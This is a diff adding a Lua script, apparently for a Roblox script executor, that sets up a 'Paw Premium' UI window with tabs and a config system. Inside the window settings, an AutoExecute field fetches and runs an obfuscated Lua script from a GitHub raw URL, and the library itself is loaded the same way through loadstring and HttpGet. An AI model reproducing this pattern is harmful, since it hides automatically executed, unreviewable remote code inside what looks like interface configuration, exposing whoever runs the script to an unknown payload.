@@ -1,0 +1,38 @@
+local Paw = loadstring(game:HttpGet(
+    "YOUR_PRIVATE_PAW_SOURCE_URL"
+))()
+
+local Window = Paw:Window({
+    Title = "Paw Premium",
+    Logo = "paw-print",
+    ConfigFolder = "PawPremium",
+
+    -- Blur is automatic in the modified library.
+    AutoExecute = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IsnowDev7/IsnowDev/refs/heads/main/obfuscated_script-1783849471583.lua.txt"))()
+]],
+
+    AutoRejoin = true,
+})
+
+-- Creates the config panel and runs the selected autoload config.
+local Config = Window:CreateConfigSystem()
+
+local Main = Window:Tab({
+    Name = "Main",
+    Icon = "house",
+})
+
+Main:Section({
+    Name = "Status",
+    Icon = "activity",
+})
+
+-- Hide the window while keeping it available to reopen.
+-- Window:Close()
+
+-- Reopen the window with blur fade-in.
+-- Window:Open()
+
+-- Permanently destroy the window and blur effect.
+-- Window:Destroy()
